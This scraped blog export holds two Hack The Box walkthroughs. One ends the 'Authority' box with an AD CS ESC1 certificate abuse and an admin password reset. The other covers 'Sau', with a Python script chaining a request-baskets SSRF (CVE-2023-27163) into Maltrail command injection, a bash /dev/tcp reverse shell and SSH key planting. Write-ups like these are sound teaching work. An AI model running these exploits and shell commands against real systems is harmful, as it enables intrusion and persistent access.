Certify : For replacing the built-in Windows GUI tools for requesting certificates from the AD-CS. Also finds vulnerabilities in AD-CS. Ex. Certify.exe find /clientauth will query certificate templates that provide the ClientAuth EKU. Rubeus : A counterpart to Certify for interacting with Kerberos (usually for using forged certs to authenticate) certipy : An &ldquo;offensive tool for enumerating and abusing Active Directory Certificate Services&rdquo;. The github repo&rsquo;s description links to the article I referred to in the previous paragraph. BloodHound : For linking together a chain of vulnerabilities between different pieces involved in Active Directory (and certificate requesting / signing) Following the steps outlined on the Hacktricks page, I decided to start with certipy. I&rsquo;ll check if there are any vulnerable certificate templates. From my attacker box I ran the following:
certipy find -u &#39;svc_ldap@authority.htb&#39; -p &#39;lDaP_1n_th3_cle4r!&#39; -dc-ip $RADDR This took a little bit of time, then generated three files: one json, one txt and one zip. To see the output, I checked the txt file:
&#x1f911; Wow, that worked like a charm! The tool found 36 templates, and showed that one of them was vulnerable - it even says which vulnerability was found! Here, &ldquo;ESC1&rdquo; refers to the type of certificate vulnerability as originally described by that article that everyone keeps referencing.
In short, this ESC1 vulnerability means that there is a template that permits Client Authentication in the cert&rsquo;s Extended Key Usage (EKU), and that in a Certificate Signing Request (CSR) we are able to specify our own Subject Alternate Name (SAN). This should be usable to request a certificate for an arbitrary user &#x1f91e;
Quick side-note: I found something very juicy inside the PWM log file
Not only is there a password (near the bottom) but also a version number for PWM: v2.0.3 (top line)
Having confirmation that the template introduces the ESC1 vulnerability, I next tried to request the certificate:
certipy req -u &#39;svc_ldap@authority.htb&#39; -p &#39;lDaP_1n_th3_cle4r!&#39; -ca &#39;AUTHORITY-CA&#39; -target-ip $RADDR -template &#39;CorpVPN&#39; -upn &#39;Administrator@authority.htb&#39; The result was an error message:
Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate. &#x1f914; Ok, that makes a bit of sense. After all, the certipy find command showed the vulnerability:
ESC1 : 'AUTHORITY.HTB\\\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
So the problem might be that I&rsquo;m trying to request a certificate as svc_ldap but that user is not permitted to do so. Maybe I&rsquo;ll try using certipy to generate a new user, then try making the certificate request originate from that user instead?
certipy account create -user Jimbo -username svc_ldap@authority.htb -p &#39;lDaP_1n_th3_cle4r!&#39; -upn Administrator -scheme ldaps -dc-ip $RADDR -debug Certipy automatically generated a password. The new credential is Jimbo : JfiriHHtb53aiDMT. However, when I check net users via the evil-winrm shell, the new Jimbo user does not appear - this makes me think that adding the user probably was not actually successful.
At the suggestion of a very helpful HTB user, @mark94, I&rsquo;ll try using impacket-addcomputer instead.
impacket-addcomputer -computer-name BOSSCOMPUTER1 -computer-pass password123 -method LDAPS -port 636 -dc-ip $RADDR &#39;authority.htb/svc_ldap:lDaP_1n_th3_cle4r!&#39; That command reported success. I moved on to re-try the certipy req. At first, it did not work:
No real statement about the error; just a line instructing to use -debug - so I did:
certipy req -u &#39;BOSSCOMPUTER1$&#39; -p &#39;password123&#39; -ca &#39;AUTHORITY-CA&#39; -target-ip $RADDR -template &#39;CorpVPN&#39; -upn &#39;Administrator&#39; -debug Wait, what? Did that actually work?
Using the Certificate It definitely did produce a certificate: administrator.pfx. I&rsquo;ll try using it to log in. Still loosely following the instructions from the Hacktricks page, I&rsquo;ll try to use certipy to authenticate:
certipy auth -pfx &#39;administrator.pfx&#39; -username &#39;Administrator&#39; -domain &#39;authority.htb&#39; -dc-ip $RADDR I guess the intended result of that command is that I&rsquo;d be granted a a ticket-granting-ticket (TGT) from Kerberos. Unfortunately, it did not work. Instead, I looked up how I can use WinRM to login using just the certificate for authentication (much like using ssh -i &lt;privatekey&gt;). Shown in this article, it looks like the proper syntax is this:
evil-winrm -S -i 10.10.10.103 -u amanda -p Ashare1972 -c certnew.cer -k private.key Ah ok, so expects the certificate to be in the form of a .cer certificate file and a .key private key file. No problem, thankfully certipy has a function for exactly this:
certipy cert -pfx &#39;administrator.pfx&#39; Shown below, that command outputs both the .cer portion and the .key portion to stdout.
To separate them, I simply copy-pasted the two components into two separate files administrator.cer and administrator.key.
With that handled, I&rsquo;ll try logging in using WinRM&hellip; But unfortunately it seems that the password field is required even if a key is provided. Just in case, I tried it with a fake password
evil-winrm -S -c administrator.cer -k administrator.key -i $RADDR -u Administrator -p unknown Unsurprisingly, it did not work.
Rubeus seems like it is able to provided a TGT based only on the certificate and private key. But since it is only in C# and I would need to compile the code myself, I kept looking a for an alternative idea&hellip;
&#x1f4a1; We have a private key and a certificate - you&rsquo;d think it would be possible to assign a new password to the account the at the certificate is for, right? If I knew the password, I could proceed with the original plan and simply log in using evil-winrm. After much reading, I finally found an article talking about doing exactly that. They make reference to a tool called PassTheCert, which has a python implementation - let&rsquo;s give that a go!
python3 ~/Tools/WINDOWS/passthecert.py -new-pass adminpassword -dc-ip $RADDR -crt administrator.cer -key administrator.key -domain authority.htb That seems like a good sign &#x1f605; Let&rsquo;s try Evil-WinRM with the new credential: Administrator : adminpassword
&#x1f63f; Not successful. At least I know it was an Authorization Error. Thankfully, it looks like PassTheCert.py has another similar function for resetting passwords, using the modify_user action.
python3 ~/Tools/WINDOWS/passthecert.py -action modify_user -dc-ip $RADDR -crt administrator.cer -key administrator.key -domain authority.htb -target Administrator -new-pass Ok, so it&rsquo;s saying the new credential is Administrator : V7kn2XDRyH11HCdo8fkeyr2UNc9dSucQ. Let&rsquo;s try Evil-WinRM once again:
&#x1f601; YES!!! IT FINALLY WORKED! I am absolutely overjoyed to be done this box. I hope I don&rsquo;t have to touch Windows for a long time.
Simply read the flag and leave this godforsaken operating system as fast as you can:
type root.txt LESSONS LEARNED Attacker Port scans can&rsquo;t be too fast. Using too aggressive of timing settings will lead to some ports falsely appearing. In my workflow, that means that Keep hints in mind. Sometimes, the box creator will leave little fairly large hints out in the open. In my experience, these tend to be very helpful. The best example is from this box is the &ldquo;PWM is in configuration mode&rdquo; dialog that appeared. Hints like this can be useful for focusing your search when attack surface seems too broad to approach smartly. Research, research, research. Knowing about vulnerabilities like the improper configuration of Active Directory Certificate Signing is absolutely invaluable if you plan on exploiting it. Also, instead of identifying a vulnerability and diving into an attempt to exploit it, doing a little extra research can save time: it helps point out useful tools that others have made, and sometimes even PoC code to get you started. Consider a post-exploitation framework. Several tools could have helped me perform enumeration and identify the AD-CS vulnerabilities faster. They can also help keep notes more succinct. Defender Encryption guarding admin secrets should be especially strong. The Ansible Vault was too easily cracked.
Remove development systems from production. There was no reason that PWM should have been accessible at all, since it wasn&rsquo;t yet fully configured. But along the same lines, the feature for testing the PWM was the key to gaining foothold. This should have simply been removed.
Using a password manager is a great start, but better yet, just use an SSO service. Having separation between your servers and your auth system helps create a gap: if one becomes compromised, at least it wasn&rsquo;t both.
Stay on top of threat intelligence. Don&rsquo;t just rely on software updates and patches - the vendor won&rsquo;t always be willing to fix the problem: this was the case with the AD-CS vulnerability on this box.
`,url:"https://4wayhandshake.github.io/walkthrough/authority/"},"https://4wayhandshake.github.io/walkthrough/sau/":{title:"Sau",tags:["CVE","SSRF","Vulnerability Chaining","Command Injection","Common Program Privesc"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION At the time of writing this walkthrough, this is still an Active box. It was released as the fourth box for HTB&rsquo;s Hackers Clash: Open Beta Season II. Sau is an &ldquo;Easy&rdquo; Linux box, named after its creator, sau123. At face value, the box is a server hosting a web-app for collecting and displaying HTTP requests. The user is able to define &ldquo;baskets&rdquo; to catch requests, where the requests and their responses can later be analyzed - including their body and headers. Sau is a well-made easy box, with a straightforward path to the end. The foothold has multiple steps, emphasizing the importance of good enumeration and research. Once foothold is gained, recognition and understanding of the underlying vulnerability will ensure a quick sprint to the root flag.
RECON nmap scans For this box, I&rsquo;m running the same enumeration strategy as the previous boxes in the Open Beta Season II. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to my target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 5000 -oN nmap/port-scan.txt $RADDR The results showed only ports 22 (SSH), and 80 (HTTP):
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 11:27 IDT Nmap scan report for sau.htb (10.10.11.224) Host is up (0.18s latency). Not shown: 985 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 32/tcp filtered unknown 80/tcp filtered http 1149/tcp filtered bvtsonar 1163/tcp filtered sddp 1782/tcp filtered hp-hcip 3828/tcp filtered neteh 5431/tcp filtered park-agent 6792/tcp filtered unknown 10010/tcp filtered rxapi 13782/tcp filtered netbackup 26214/tcp filtered unknown 44443/tcp filtered coldfusion-auth 50006/tcp filtered unknown 55555/tcp open unknown That is a LOT of filtered ports&hellip; Only two open ports: 22 and 55555. I will try to figure out what&rsquo;s on 55555 detailed script scan on these ports:
nmap -sV -sC -n -Pn -p22,55555 -oN nmap/extra-scan.txt $RADDR Some text:
Nmap scan report for 10.10.11.224 Host is up (0.17s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 aa8867d7133d083a8ace9dc4ddf3e1ed (RSA) | 256 ec2eb105872a0c7db149876495dc8a21 (ECDSA) |_ 256 b30c47fba2f212ccce0b58820e504336 (ED25519) 55555/tcp open unknown | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 400 Bad Request | Content-Type: text/plain; charset=utf-8 | X-Content-Type-Options: nosniff | Date: Mon, 10 Jul 2023 09:52:20 GMT | Content-Length: 75 | invalid basket name; the name does not match pattern: ^[wd-_\\.]{1,250}$ | GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 302 Found | Content-Type: text/html; charset=utf-8 | Location: /web | Date: Mon, 10 Jul 2023 09:51:51 GMT | Content-Length: 27 | href=&#34;/web&#34;&gt;Found&lt;/a&gt;. | HTTPOptions: | HTTP/1.0 200 OK | Allow: GET, OPTIONS | Date: Mon, 10 Jul 2023 09:51:52 GMT |_ Content-Length: 0 Ah ok. It is just a webserver after all. The &ldquo;invalid basket name&rdquo; intrigues me a bit. It provides regex:
invalid basket name; the name does not match pattern: ^[wd-_\\.]{1,250}$
It looks like a regex way of stating &ldquo;1 to 250 characters of either &lsquo;w&rsquo;, &rsquo;d&rsquo;, &lsquo;-&rsquo;, &lsquo;_&rsquo;, or &lsquo;.&rsquo; &ldquo;. However, when I pop it into RegExr it states that a portion of that regex is invalid. It could be a different flavor of regex, in which case &lsquo;w&rsquo; is probably interpreted as &lsquo;word&rsquo;, &rsquo;d&rsquo; as &lsquo;digit&rsquo;, and the special characters interpreted as themselves? I&rsquo;m sure this will come up later.
Webserver Strategy Did banner-grabbing:
whatweb $RADDR:55555 &amp;&amp; curl -IL http://$RADDR:55555 There is a redirect to /web, but it supports GET. Added sau.htb to /etc/hosts and proceeded with vhost enumeration, subdomain enumeration, and directory enumeration.
echo &#34;10.10.11.224 sau.htb&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt&#34; ffuf -w $WLIST -u http://$RADDR:55555 -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost.md -of md -timeout 4 -ic -ac ffuf -w $WLIST -u http://$RADDR:55555 -H &#34;Host: FUZZ.sau.htb&#34; -c -t 60 -o fuzzing/vhost-sau.md -of md -timeout 4 -ic -ac ffuf -w $WLIST -u http://FUZZ.$DOMAIN:55555 -c -t 60 -o fuzzing/subdomain.md -of md -timeout 4 -ic -ac There were no results from vhost or subdomain enumeration, so I proceeded with directory enumeration on http://sau.htb:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt&#34; feroxbuster -w $WLIST -u http://$DOMAIN:55555 -A -d 1 -t 100 -T 4 -f -E --auto-tune --collect-words --filter-status 400,401,402,404,405 --output fuzzing/directory.json feroxbuster flags explanation:
-A : Randomize the user-agent -d 2 : Recurse to a depth of 2 only -t 100 : Run using 100 threads -T 4 : Use a 4s timeout on all requests -f : Try adding a slash for each request. Useful if you don&rsquo;t know what type of webserver is running. -E : Collect known file extensions (ex .php or .js) --auto-tune : Adjust speed and request patterns if excessive errors are encountered. --collect-words : On successful page loads, read the pages to extract keywords; prepend to wordlist. --filter-status : Reject all usual HTTP 4xx statuses except 403 --output : Output results as json to file
Directory enumeration gave the following:
Exploring the Website To the reader: you may skip ahead to API Enumeration if you&rsquo;re short on time. This section turned out to be unimportant to the end result.
I took a quick look through the website. The page at /web allows the user to create or select a new basket. The basket IDs get stored in the client&rsquo;s localstorage. Optionally, they can click the cog button in the top-right to go to /web/baskets, the admin page. To access it, you need the &ldquo;master token&rdquo;:
Checking the source code of the page, most of it is the typical plumbing of a website like this, one interesting bit is the createBasket function:
function createBasket() { var basket = $.trim($(&#34;#basket_name&#34;).val()); if (basket) { $.ajax({ method: &#34;POST&#34;, url: &#34;/api/baskets/&#34; + basket, headers: { &#34;Authorization&#34; : sessionStorage.getItem(&#34;master_token&#34;) } }).done(function(data) { localStorage.setItem(&#34;basket_&#34; + basket, data.token); $(&#34;#created_message_text&#34;).html(&#34;&lt;p&gt;Basket &#39;&#34; + basket + &#34;&#39; is successfully created!&lt;/p&gt;&lt;p&gt;Your token is: &lt;mark&gt;&#34; + data.token + &#34;&lt;/mark&gt;&lt;/p&gt;&#34;); $(&#34;#basket_link&#34;).attr(&#34;href&#34;, &#34;/web/&#34; + basket); $(&#34;#created_message&#34;).modal(); addBasketName(basket); }).always(function() { randomName(); }).fail(onAjaxError); } else { $(&#34;#error_message_label&#34;).html(&#34;Missing basket name&#34;); $(&#34;#error_message_text&#34;).html(&#34;Please, provide a name of basket you would like to create&#34;); $(&#34;#error_message&#34;).modal(); } } Note the api endpoint: /api/baskets/[basketname]. I checked the source of the other page from directory enumeration, /web/web (which may just be a routing mistake). It reveals more API endpoints:
POST /api/baskets/[basketname] (From /web source code) GET /api/baskets/web/requests ?skip=&quot; + fetchedCount ?max=0 GET /api/baskets/web/responses/[METHOD] Displays the response PUT /api/baskets/web/responses/[METHOD] Updates the response? PUT /api/baskets/web Reconfigures the basket? GET /api/baskets/web Opens the config modal dialog DELETE /api/baskets/web/requests Deletes all requests DELETE /api/baskets/web/requests Deletes the basket. Also removes &lsquo;basket_web&rsquo; item from localstorage. The acceptSharedBasket() function is called when a user navigates to a basket whose token is not in localstorage. This function provides some details:
function acceptSharedBasket() { var token = getParam(&#34;token&#34;); if (token) { var currentToken = getBasketToken(); if (!currentToken) { localStorage.setItem(&#34;basket_web&#34;, token); } else if (currentToken !== token) { if (confirm(&#34;The access token for the &#39;web&#39; basket \\n&#34; + &#34;from query parameter is different to the token that is \\n&#34; + &#34;already stored in your browser.\\n\\n&#34; + &#34;If you trust this link choose &#39;OK&#39; and existing token will be \\n&#34; + &#34;replaced with the new one, otherwise choose &#39;Cancel&#39;.\\n\\n&#34; + &#34;Do you want to replace the access token of this basket?&#34;)) { localStorage.setItem(&#34;basket_web&#34;, token); } } window.location.href = &#34;/web/web&#34;; } } ☝️ Ok, so /web/web was not a mistake. It&rsquo;s used for accepting a link to a basket that has been shared with the user by another user.
💡 Given the slightly janky way that many of the requests to the API get built/parsed, my early bet is that there is some kind of broken authentication on the site.
API Enumeration Thankfully, the API is small enough to enumerate manually. I ran the following (try each HTTP method on all discovered API endpoints under /api/baskets/web/):
for METHOD in GET POST PUT DELETE; do ffuf -w $WLIST:FUZZ -u http://$RADDR:55555/api/baskets/web/FUZZ -t 80 -c -timeout 4 --recursion --recursion-depth 2 -X $METHOD -v; done Results:
GET http://10.10.11.224:55555/api/baskets/web/ POST http://10.10.11.224:55555/api/baskets/web/ http://10.10.11.224:55555/api/baskets/web/requests PUT http://10.10.11.224:55555/api/baskets/web/ http://10.10.11.224:55555/api/baskets/web/requests DELETE http://10.10.11.224:55555/api/baskets/web/ Also&hellip; GET http://10.10.11.224:55555/api/stats I&rsquo;ll try just using the site normally to get a better feel for how it works; I&rsquo;ll create a new basket and try sending a couple requests:
It looks like the app also has the ability to proxy any requests. This might be interesting. Perhaps there&rsquo;s a way to use this to do some kind of SSRF? I&rsquo;ll investigate this after a bit more recon 🚩
Back on the main page, /web, it the page footer reveals that this web app uses an open source project: https://github.com/darklynx/request-baskets. Also, it shows we&rsquo;re using request-baskets v1.2.1 I&rsquo;ll check the github page and see if there are default credentials, or anything suspicious in the Issue log. Checking the changelog for v1.2.2 seemed like a sensible place to start, and gave some juicy details right away, inside the commit &ldquo;lets simplify script to setup DBs for testing&rdquo;:
Great, now we know that it&rsquo;s preconfigured to use PostgresSQL (on port 5432) and MySQL (on port 3306), with the same default user:
rbaskets : pwd I&rsquo;ll try using that proxy feature and logging into MySQL with it:
Hmm, nope. I&rsquo;m probably doing something wrong on my end. I&rsquo;ll check online to see if anyone else has tried finding vulnerabilities in request-baskets. Immediately I found CVE-2023-27163:
request-baskets up to v1.2.1 was discovered to contain a Server-Side Request Forgery (SSRF) via the component /api/baskets/{name}. This vulnerability allows attackers to access network resources and sensitive information via a crafted API request.
👍 Excellent - I wasn&rsquo;t too far off the mark.
FOOTHOLD SSRF Investigation Checking out this CVE, it looks like the exploit is extremely simple:
Create a basket. Note the ID of the basket
Issue POST requests to /api/baskets/[ID], specifying the proxy address within the POST data:
{ &#34;forward_url&#34;: &#34;http://127.0.0.1:80/test&#34;, &#34;proxy_response&#34;: false, &#34;insecure_tls&#34;: false, &#34;expand_path&#34;: true, &#34;capacity&#34;: 250 } I found another resource that is a description (aka crawl and copy) of the PoC within the initial disclosure (unfortunately, I cannot access the initial disclosure):
request-baskets SSRF details Follow the official documentation to start forem with docker installation. Then, we log in to the administrator background: The following API’s forward_url parameter is vulnerable to SSRF： 1. /api/baskets/{name} 2. /baskets/{name} Let’s take /api/baskets/{name} API as an example, another API is the same vulnerability. We use the following payload to post /api/baskets/{name} API： { &quot;forward_url&quot;: &quot;http://127.0.0.1:80/test&quot;, &quot;proxy_response&quot;: false, &quot;insecure_tls&quot;: false, &quot;expand_path&quot;: true, &quot;capacity&quot;: 250 } ! Direct post can only set the url, you need to visit the url - http://192.168.175.213:55555/test to trigger the SSRF vulnerability. # Influence： Information Disclosure and Exfiltration This was previously identified as an issue. Requests for images that are unauthenticated can lead to the leak of all existing images in the server. However, this isn’t limited to just images. Any resource that can be obtained via an HTTP request on the local network of the webserver can be obtained remotely via this request. Unauthenticated Access to Internal Network HTTP Servers The SSRF attack can be leveraged to connect to any HTTP Server connected to the same network as the request-baskets server, for instance an Nginx server exposed only internally, an internal RESTful API, such as a NoSQL database, or a GraphQL database. This is not limited just to services hosted on the local machine, but all the machines connected on the local network. Port and IP Scanning and Enumeration This vulnerability can be leveraged to port scan for HTTP servers both internal and external services on demand, as well as enumerating all the machines in the local network that have open HTTP ports.
In an attempt to perform what is described above, I wrote the following script (final version shown later in the walkthrough):
My initial reaction is always to just try an exploit like this in the browser or Burp Proxy. However, I often make small mistakes or malform the request, etc. In an effort to avoid that, I figured I would try the same process using Python + Requests.
#!/bin/python3 &#39;&#39;&#39; From https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3 POC: POST /api/baskets/{name} API with payload - {&#34;forward_url&#34;: &#34;http://127.0.0.1:80/test&#34;,&#34;proxy_response&#34;: false,&#34;insecure_tls&#34;: false,&#34;expand_path&#34;: true,&#34;capacity&#34;: 250} details can be seen: https://notes.sjtu.edu.cn/s/MUUhEymt7 &#39;&#39;&#39; import requests import argparse parser = argparse.ArgumentParser( prog=&#39;CVE-2023-27163-exploit.py&#39;, description=&#39;Exploit the SSRF vulnerability in Request-Baskets (v1.2.1 or earlier)&#39;, epilog=&#39;Author: 4wayhandshake&#39;) parser.add_argument(&#39;target&#39;, help=&#39;The URL of the target, Ex. &#34;http://10.10.11.224:55555&#34;)&#39;, type=str) parser.add_argument(&#39;basket&#39;, help=&#39;The ID of the basket to use (Ex. &#34;geto2km&#34;)&#39;, type=str) args = parser.parse_args() s = requests.session() def postTarget(resource): target_url = f&#39;{args.target}/api/baskets/{args.basket}&#39; payload = { &#34;forward_url&#34;: f&#39;http://127.0.0.1:55555/{resource}&#39;, &#34;proxy_response&#34;: False, &#34;insecure_tls&#34;: False, &#34;expand_path&#34;: True, &#34;capacity&#34;: 250 } response = s.post(target_url, json=payload, timeout=2.50) print(f&#39;[{response.status_code}] {response.text}&#39;) def getTarget(resource): target_url = f&#39;{args.target}/{args.basket}/{resource}&#39; response = s.get(target_url, timeout=2.50) print(f&#39;[{response.status_code}] {response.text}&#39;) while True: try: resource = input(&#34;&gt; &#34;) postTarget(resource) getTarget(resource) except requests.exceptions.ReadTimeoutError as e: print(e) except KeyboardInterrupt as e: print(&#34;Exiting...&#34;) break Unfortunately, this yielded no result. I&rsquo;ll try parameterizing the forward_url and attempt to get it to contact my own box. On my attacker box, I created a python http webserver:
Note: ~/Tools/STAGING is a directory containing my &ldquo;toolbox&rdquo;. Most importantly, it contains a simple index.html file. I usually download this directory&rsquo;s contents the target box after obtaining a reverse shell. For more details, please see my User Enumeration - Linux strategy.
sudo ufw allow from 10.10.11.224 to any port 8000 proto tcp cp -r ~/Tools/STAGING www &amp;&amp; cd www python3 -m http.server 8000 And modify the script&rsquo;s postTarget() function:
... parser.add_argument(&#39;target&#39;, help=&#39;The URL of the target, Ex. &#34;http://10.10.11.224:55555&#34;)&#39;, type=str) parser.add_argument(&#39;forward&#39;, help=&#39;Forward URL, Ex. &#34;http://10.10.14.3:8000&#34;)&#39;, type=str) parser.add_argument(&#39;basket&#39;, help=&#39;The ID of the basket to use (Ex. &#34;geto2km&#34;)&#39;, type=str) args = parser.parse_args() s = requests.session() def postTarget(): target_url = f&#39;{args.target}/api/baskets/{args.basket}&#39; payload = { &#34;forward_url&#34;: args.forward, &#34;insecure_tls&#34;: False, &#34;proxy_response&#34;: False, &#34;expand_path&#34;: True, &#34;capacity&#34;: 250 } response = s.post(target_url, json=payload, timeout=2.50) ... I&rsquo;ll run the script and try contacting my local webserver using the forward_url:
Success! On the local webserver we see the GET request come in, and via the proxy we receive index.html. Great, now we know that the forward_url parameter works as expected. I&rsquo;ll try doing as the PoC for the CVE says, and set the forward_url to the localhost - more like a traditional SSRF:
That&rsquo;s unexpected. The server replies with status 200 on any request, like a wildcard directory. When I try using a path expansion by introducing ../ into the request, the result is what we get at http://sau.htb:55555/web. I&rsquo;ll try enumerating this directory to see what else is there:
ffuf -w $WLIST:FUZZ -u http://$RADDR:55555/test9/FUZZ -t 80 -c -timeout 4 -r -v OK, there&rsquo;s the wildcard directory. Now I&rsquo;ll try the parent directory:
ffuf -w $WLIST:FUZZ -u http://$RADDR:55555/test9/../FUZZ -t 80 -c -timeout 4 -r -v -fw 1 I think it&rsquo;s safe to say that the SSRF is not working: these results match the regular website on 55555. The previous two ffuf attempts correspond to the /web/[basketID] and /web/web endpoints under 55555. What could have been wrong? Perhaps one of the parameters to set up forwarding:
forward_url seems like it is correct: we want to request resources at http://127.0.0.1:80/ insecure_tls shouldn&rsquo;t matter at all, because we&rsquo;re not forwarding to a server using https expand_path seems like it will be very useful for performing directory traversal. If it&rsquo;s working already, why not keep it on? capacity shouldn&rsquo;t matter either: it&rsquo;s just the number of requests held in the &ldquo;bucket&rdquo;, so shouldn&rsquo;t have an effect on forwarding. &hellip; maybe proxy_response is the problem? 🤔 To try this out, I changed proxy_response to True in the script:
... payload = { &#34;forward_url&#34;: args.forward, &#34;insecure_tls&#34;: False, &#34;proxy_response&#34;: True, &#34;expand_path&#34;: True, &#34;capacity&#34;: 250 } ... After that modification, I&rsquo;ll try running it again, using the forward_url to the target&rsquo;s localhost port 80:
Excellent! port 80 has an index page with title Maltrail. I wonder what it is. I&rsquo;ll check it out in the browser:
Port 80 (filtered) Looks like styles maybe didn&rsquo;t load, but that&rsquo;s definitely a different website! 👏 Most importantly, we see that it is a service called Maltrail (v0.53). The links at the top of the page all point to the Maltrail github repo. Since this is http, it&rsquo;s probably a good idea to try directory enumeration:
Interesting results. The /ping and /whoami pages are especially interesting.
/whoami doesn&rsquo;t seem to do anything right now (with empty request headers etc.);
/ping replies with a single word pong
/ is as shown in the screenshot above
/index reveals a login page, shown in the screenshot below.
Command Injection via SSRF After enumeration, I checked searchsploit to see if there is exploit code for Maltrail: there is not. However, some quick web searching yielded a result: I found this page describing a critical (10/10) vulnerability applicable to this version of Maltrail:
That article provides the following PoC:
curl &#39;http://hostname:8338/login&#39; \\ --data &#39;username=;\`id &gt; /tmp/bbq\`&#39; The script will need to be modified to perform POST requests to the login (index) endpoints instead of GET requests to localhost:80.
... def commandInjection(cmd): target_url = f&#39;{args.target}/{args.basket}/index&#39; command = f&#39;;{cmd}&#39; # Later, url-encode this or maybe b64 it payload = { &#34;username&#34;: command } response = s.post(target_url, data=payload, timeout=2.50) print(f&#39;[{response.status_code}] {response.text}&#39;) postTarget() while True: try: cmd = input(&#34;&gt; &#34;) commandInjection(cmd) except (requests.exceptions.ReadTimeout, requests.exceptions.ConnectTimeout) as e: print(e) except KeyboardInterrupt as e: print(&#34;Exiting...&#34;) break I tried several commands to test the injection (including the URL-encoded version of each), such as nc 10.10.14.4 4444 and wget http://10.10.14.4:8000. I didn&rsquo;t get any evidence that the command executed. What could be wrong? To investigate, I tried the actual login page and proxied the request through Burp:
Oh, I see: First of all, it&rsquo;s posting to /login. Also, there&rsquo;s a hash with a nonce. Thankfully, since it&rsquo;s only the password field that isn&rsquo;t present in the request, there&rsquo;s a good chance that the hash was only taken for the password. If this is true, sending the same hash every time should be fine, as long as the server isn&rsquo;t actually checking for a unique nonce 👀&hellip; Also, it probably makes sense to URL-encode the whole command.
😱 I also realized that I forgot to include backticks in the command! No wonder nothing was running. I&rsquo;m not sure if adding the nonce/hash was useful, but the rest of the modifications seemed to work.
To accommodate these discoveries, I modified the script into the following final version:
#!/bin/python3 &#39;&#39;&#39; Chain together exploits to two vulnerabilities: Vulnerability #1: CVE-2023-27163 Inspiration from gist at https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3 PoC: POST /api/baskets/{name} API with payload - {&#34;forward_url&#34;: &#34;http://127.0.0.1:80/test&#34;,&#34;proxy_response&#34;: false,&#34;insecure_tls&#34;: false,&#34;expand_path&#34;: true,&#34;capacity&#34;: 250} details can be seen: https://notes.sjtu.edu.cn/s/MUUhEymt7 Vulnerability #2: Unauthenticated OS Command Injection in stamparm/maltrail See https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/ PoC: curl &#39;http://hostname:8338/login&#39; --data &#39;username=;\`id &gt; /tmp/bbq\`&#39; &#39;&#39;&#39; import requests import argparse import urllib.parse parser = argparse.ArgumentParser( prog=&#39;exploit.py&#39;, description=&#39;Exploit the SSRF vulnerability in Request-Baskets (v1.2.1 or earlier), then the command injection vulnerability in Maltrail (v0.54 or earlier)&#39;, epilog=&#39;Author: 4wayhandshake&#39;) parser.add_argument(&#39;target&#39;, help=&#39;The URL of the target, Ex. &#34;http://10.10.11.224:55555&#34;)&#39;, type=str) parser.add_argument(&#39;forward&#39;, help=&#39;Forward URL, Ex. &#34;http://127.0.0.1:80&#34;)&#39;, type=str) parser.add_argument(&#39;basket&#39;, help=&#39;The ID of the basket to use (Ex. &#34;geto2km&#34;)&#39;, type=str) args = parser.parse_args() s = requests.session() def postTarget(): target_url = f&#39;{args.target}/api/baskets/{args.basket}&#39; payload = { &#34;forward_url&#34;: args.forward, &#34;insecure_tls&#34;: False, &#34;proxy_response&#34;: True, &#34;expand_path&#34;: True, &#34;capacity&#34;: 250 } response = s.post(target_url, json=payload, timeout=2.50) print(f&#39;[{response.status_code}] {response.text}&#39;) def commandInjection(cmd): target_url = f&#39;{args.target}/{args.basket}/login&#39; command = urllib.parse.quote_plus(f&#39;;\`{cmd}\`&#39;) payload = { &#34;username&#34;: command, &#34;hash&#34;: &#34;145e5a296fbfc8c6182ddff9a21eba2fa3897d61de023b2dde1c7c330dccc78a&#34;, &#34;nonce&#34;: &#34;7qK7ycjX7Ypt&#34; } response = s.post(target_url, data=payload, timeout=10.0) print(f&#39;[{response.status_code}] {response.text}&#39;) postTarget() while True: try: cmd = input(&#34;&gt; &#34;) commandInjection(cmd) except (requests.exceptions.ReadTimeout, requests.exceptions.ConnectTimeout) as e: print(e) except KeyboardInterrupt as e: print(&#34;Exiting...&#34;) break With the modifications to the script complete, I&rsquo;ll try it again:
😁 Alright! Looks like I&rsquo;ve got command injection. My attempts with nc 10.10.14.4 4444 and wget http://10.10.14.4:8000 were both successful:
Reverse Shell Let&rsquo;s turn this command injection into a full reverse shell. It should be as simple as sending one command. First, I&rsquo;ll try a bash reverse shell bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.4/4444 0&gt;&amp;1':
There we go! Worked first try 👍
USER FLAG Upgrading the Shell I&rsquo;ll start out by attempting to upgrade my shell:
which python3 python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; ctrl+z stty raw -echo fg [enter] [enter] export TERM=xterm-256color alias ll=&#34;ls -lah&#34; Planting an SSH key The reverse shell is pretty good, but it would be even better to have SSH. Let&rsquo;s plant an SSH key into the puma user for a more stable connection. First, on the attacker box, create a key, then base64-encode the pubkey:
